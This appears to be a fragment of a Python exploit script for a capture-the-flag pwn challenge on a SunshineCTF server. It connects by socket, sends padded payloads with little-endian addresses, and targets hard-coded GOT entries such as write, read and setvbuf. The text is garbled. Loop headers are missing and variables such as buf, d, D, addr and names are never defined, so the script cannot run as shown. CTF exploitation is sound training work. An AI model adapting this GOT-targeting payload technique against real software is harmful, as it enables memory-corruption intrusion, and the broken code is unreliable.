import socket, time

HOST="chal.sunshinectf.games"; PORT=26002
s=socket.create_connection((HOST,PORT),timeout=10)

    buf+=s.recv(4096)
buf = buf.split(b"score> ",1)[1]

def one(payload, wait=0.4):
    global buf
    s.sendall(payload+b"\n")
    time.sleep(wait)
    s.settimeout(1.2)
    while b"score> " not in buf:
        try:
            c=s.recv(4096)
        except socket.timeout:
            break
        if not c: break
        buf+=c
    i=buf.find(b"\nscore> ")
    if i==-1:
        body=buf; buf=b""
    else:
        body=buf[:i]; buf=buf[i+1+len("score> "):]
    return body

got={"write":0x404000,"strlen":0x404008,"strcspn":0x404010,"read":0x404018,"setvbuf":0x404020}

    payload=d+b"A"*(D-len(d))+addr.to_bytes(8,'little')
    body=one(payload)

    for j in range(i+1,len(names)):
